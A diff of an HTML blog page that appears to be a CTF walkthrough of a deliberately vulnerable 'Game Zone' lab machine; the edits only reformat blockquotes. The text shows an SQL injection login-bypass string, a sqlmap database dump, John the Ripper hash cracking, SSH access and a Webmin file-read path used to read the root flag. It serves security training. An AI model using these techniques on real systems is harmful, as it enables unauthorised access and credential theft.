@@ -15,13 +15,15 @@ Enjoy!</p>
 </ul>
 <h2 id="task-1-deploy-the-vulnerable-machine">[Task 1] Deploy the vulnerable machine</h2>
 <blockquote>
-<p>Question #2 What is the name of the large cartoon avatar holding a sniper on the forum?</p></blockquote>
+<p>Question #2 What is the name of the large cartoon avatar holding a sniper on the forum?</p>
+</blockquote>
 <p>For this we could do an image search but, since I know this from my old gamer times. It was quite easy to answer. If you don&rsquo;t know the answer, google is your friend.</p>
 <h2 id="task-2-obtain-access-via-sqli">[Task 2] Obtain access via SQLi</h2>
 <p>So we need to exploit SQLi (injection) to get access to the server.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>	<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> username <span style="color:#f92672">=</span> <span style="color:#66d9ef">admin</span> <span style="color:#66d9ef">AND</span> password :<span style="color:#f92672">=</span> <span style="color:#e6db74">&#39; or 1=1 -- -
 </span></span></span></code></pre></div><blockquote>
-<p>Question#3 When you&rsquo;ve logged in, what page do you get redirected to?</p></blockquote>
+<p>Question#3 When you&rsquo;ve logged in, what page do you get redirected to?</p>
+</blockquote>
 <p>Às per the room we know there is no Admin username. In this case we can still use the following string as username leaving the password empty.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>	<span style="color:#e6db74">&#39; or 1=1 -- -
 </span></span></span></code></pre></div><p>After a using that string as username (leaving the password empty), we get logged in and arrive to a <strong>portal.php</strong> page. We can answer the question now.</p>
@@ -68,10 +70,12 @@ Enjoy!</p>
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:10:29] [INFO] testing &#39;</span>OR boolean-based blind - WHERE or HAVING clause <span style="color:#f92672">(</span>MySQL comment<span style="color:#f92672">)</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
 </span></span></code></pre></div><p>This will take some time as SQLMap will try different ways of exploiting the DB, eventually it should dump the database.</p>
 <blockquote>
-<p>Question #2 In the users table, what is the hashed password?</p></blockquote>
+<p>Question #2 In the users table, what is the hashed password?</p>
+</blockquote>
 <p>From the data displayed by the tool we get that answer, also the next one as well.</p>
 <blockquote>
-<p>Question #3 What was the username associated with the hashed password?</p></blockquote>
+<p>Question #3 What was the username associated with the hashed password?</p>
+</blockquote>
 <p>Let&rsquo;s move to the next Task.</p>
 <h2 id="task-4-cracking-a-password-with-johntheripper">[Task 4] Cracking a password with JohnTheRipper</h2>
 <p>John the Ripper (JTR) is a fast, free and open-source password cracker. This is also pre-installed on all Kali Linux machines.</p>
@@ -98,10 +102,12 @@ Enjoy!</p>
 </span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show --format=Raw-SHA256&#34;</span> options to display all of the cracked passwords reliably
 </span></span><span style="display:flex;"><span>Session completed
 </span></span></code></pre></div><blockquote>
-<p>Question #2 What is the de-hashed password?</p></blockquote>
+<p>Question #2 What is the de-hashed password?</p>
+</blockquote>
 <p>We answered that with the ouput from John.</p>
 <blockquote>
-<p>Question #3 Now you have a password and username. Try SSH&rsquo;ing onto the machine.What is the user flag?</p></blockquote>
+<p>Question #3 Now you have a password and username. Try SSH&rsquo;ing onto the machine.What is the user flag?</p>
+</blockquote>
 <p>With the password we can now SSH into the computer:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kali@kali:~/Documents/THM/gameZone$ ssh agent47@10.10.89.82
 </span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;10.10.89.82 (10.10.89.82)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
@@ -146,7 +152,8 @@ Enjoy!</p>
 -p	Shows the process using the socket
 -n	Doesn&rsquo;t resolve service names</p>
 <blockquote>
-<p>Questions #1 How many TCP sockets are running?</p></blockquote>
+<p>Questions #1 How many TCP sockets are running?</p>
+</blockquote>
 <p>Let&rsquo;s run <strong>ss</strong> and see what it shows:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>agent47@gamezone:~$ ss -tulpn
@@ -176,11 +183,13 @@ Enjoy!</p>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Last login: Mon Aug <span style="color:#ae81ff">24</span> 14:34:33 <span style="color:#ae81ff">2020</span> from 10.13.0.34
 </span></span></code></pre></div><blockquote>
-<p>Question #2 What is the name of the exposed CMS?</p></blockquote>
+<p>Question #2 What is the name of the exposed CMS?</p>
+</blockquote>
 <p>Once complete, in your browser type <strong>localhost:10000</strong> and you can access the newly-exposed webserver.
 When we do that, we see a <strong>Webmin</strong> login form.</p>
 <blockquote>
-<p>Question #3 What is the CMS version?</p></blockquote>
+<p>Question #3 What is the CMS version?</p>
+</blockquote>
 <p>At this point we do have a username and password, so let&rsquo;s login to see the Webmin logged user page. With that we should have the information we need for Question number 3.</p>
 <h2 id="task-6-privilege-escalation-with-metasploit">[Task 6] Privilege Escalation with Metasploit</h2>
 <p>Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine.</p>
@@ -198,7 +207,8 @@ When we do that, we see a <strong>Webmin</strong> login form.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://localhost:10000/file/show.cgi/root/root.txt
 </span></span></code></pre></div><p>Once we run that command the browser will read out the contents of root.txt and give us the answer to the last Question:</p>
 <blockquote>
-<p>Question #1 What is the root flag?</p></blockquote>
+<p>Question #1 What is the root flag?</p>
+</blockquote>
 <p>a4b94{redacted_root_flag_XD}</p>
 <p>As usual, happy hacking.</p>
 <link
